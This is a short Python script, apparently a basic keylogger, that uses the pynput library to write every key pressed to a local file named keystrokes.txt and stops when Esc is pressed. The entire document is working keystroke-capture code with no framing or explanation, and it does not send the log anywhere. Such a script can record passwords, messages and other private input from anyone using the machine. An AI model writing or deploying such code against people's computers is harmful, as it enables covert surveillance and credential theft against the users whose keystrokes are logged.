from pynput import keyboard

def on_press(key):
    try:
        with open("keystrokes.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (like space, enter, etc.) will throw an AttributeError for .char
        with open("keystrokes.txt", "a") as f:
            f.write(f" {str(key)} ")

def on_release(key):
    if key == keyboard.Key.esc:  # Stop the listener when Esc is pressed
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
